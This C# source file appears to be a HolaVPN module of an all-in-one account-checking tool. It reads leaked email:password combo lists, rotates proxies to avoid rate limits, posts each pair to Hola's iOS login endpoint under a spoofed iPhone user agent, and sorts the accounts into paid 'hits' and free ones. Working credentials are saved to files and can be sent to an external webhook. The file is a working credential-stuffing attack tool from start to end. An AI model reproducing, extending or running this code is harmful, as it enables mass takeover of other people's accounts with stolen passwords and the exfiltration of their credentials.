using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using DTCCUI;
using Leaf.xNet;
using Newtonsoft.Json.Linq;

namespace DTC_AIO
{
    internal class HolaVPNmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            var capture = new StringBuilder();

                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "HolaVPN/2.12 (iPhone; iOS 12.4.7; Scale/2.00)";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            var str = "email=" + array[0] + "&password=" + array[1];
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var text2 = req.Post("https://client.hola.org/client_cgi/ios/login", str,
                                "application/x-www-form-urlencoded").ToString();
                            var flag7 = text2.Contains("token");

                            if (flag7)
                            {
                                var Plan = Parse(text2, "membership\":", "},\"");
                                if (Plan.Contains("trial\":false,\"active\":false"))
                                {
                                    Program.Frees++;
                                    Program.TotalChecks++;
                                    if (Program.lorc == "LOG") Settings.PrintFree("Hma", array[0] + ":" + array[1]);
                                    Export.AsResult("/Holavpn_frees", array[0] + ":" + array[1]);
                                }
                                else
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Hma", array[0] + ":" + array[1] + " | Plan: " + Plan);
                                    Export.AsResult("/Holavpn_hits", array[0] + ":" + array[1] + " | Plan: " + Plan);
                                }
                            }
                            else
                            {
                                var flag8 = text2.Contains("Precondition Failed");
                                if (flag8)
                                {
                                    Program.Frees++;
                                    Program.TotalChecks++;
                                    if (Program.lorc == "LOG") Settings.PrintFree("Hma", array[0] + ":" + array[1]);
                                    Export.AsResult("/Holavpn_frees", array[0] + ":" + array[1]);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "HolaVPN Hits");
                                }
                                else if (text2.Contains("Unauthorized"))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        public static IEnumerable<string> JSON(string input, string field, bool recursive = false,
            bool useJToken = false)
        {
            var list = new List<string>();

            if (useJToken)
            {
                if (recursive)
                {
                    if (input.Trim().StartsWith("["))
                    {
                        var json = JArray.Parse(input);
                        var jsonlist = json.SelectTokens(field, false);
                        foreach (var j in jsonlist)
                            list.Add(j.ToString());
                    }
                    else
                    {
                        var json = JObject.Parse(input);
                        var jsonlist = json.SelectTokens(field, false);
                        foreach (var j in jsonlist)
                            list.Add(j.ToString());
                    }
                }
                else
                {
                    if (input.Trim().StartsWith("["))
                    {
                        var json = JArray.Parse(input);
                        list.Add(json.SelectToken(field, false).ToString());
                    }
                    else
                    {
                        var json = JObject.Parse(input);
                        list.Add(json.SelectToken(field, false).ToString());
                    }
                }
            }
            else
            {
                var jsonlist = new List<KeyValuePair<string, string>>();
                parseJSON("", input, jsonlist);
                foreach (var j in jsonlist)
                    if (j.Key == field)
                        list.Add(j.Value);

                if (!recursive && list.Count > 1) list = new List<string> {list.First()};
            }

            return list;
        }

        private static void parseJSON(string A, string B, List<KeyValuePair<string, string>> jsonlist)
        {
            jsonlist.Add(new KeyValuePair<string, string>(A, B));

            if (B.StartsWith("["))
            {
                JArray arr = null;
                try
                {
                    arr = JArray.Parse(B);
                }
                catch
                {
                    return;
                }

                foreach (var i in arr.Children())
                    parseJSON("", i.ToString(), jsonlist);
            }

            if (B.Contains("{"))
            {
                JObject obj = null;
                try
                {
                    obj = JObject.Parse(B);
                }
                catch
                {
                    return;
                }

                foreach (var o in obj)
                    parseJSON(o.Key, o.Value.ToString(), jsonlist);
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}